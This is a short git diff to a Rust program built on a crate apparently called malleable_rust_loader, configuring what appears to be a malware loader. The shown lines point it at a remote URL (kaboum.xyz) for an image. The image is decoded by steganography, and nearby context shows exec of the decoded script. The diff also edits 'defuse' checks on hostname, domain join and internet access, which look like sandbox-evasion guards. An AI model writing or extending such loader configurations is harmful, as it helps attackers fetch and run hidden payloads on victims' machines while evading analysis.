@@ -1,7 +1,6 @@
 extern crate argparse;
 
 use malleable_rust_loader::dataoperation::DataOperation;
-use malleable_rust_loader::dataoperation::Stegano;
 use malleable_rust_loader::defuse::CheckInternet;
 use malleable_rust_loader::defuse::Defuse;
 use malleable_rust_loader::defuse::DomainJoin;
@@ -176,7 +175,7 @@ exec(decoded_script)
             }),
             Link::HTTP(HTTPLink {
                 url: String::from("https://kaboum.xyz/artdonjon/troll.png"),
-                dataoperation: vec![DataOperation::STEGANO(Stegano{ input_image: String::from("/home/user/stegoru/rust.png") })],
+                dataoperation: vec![DataOperation::STEGANO],
                 jitt: 0,
                 sleep: 0,
             }),
@@ -194,6 +193,7 @@ exec(decoded_script)
             Defuse::Hostname(Hostname {
                 list: vec![
                     "DEBUG-W10".to_string(),
+                    "DRACONYS".to_string(),
                 ],
                 operator: Operator::OR,
             }),
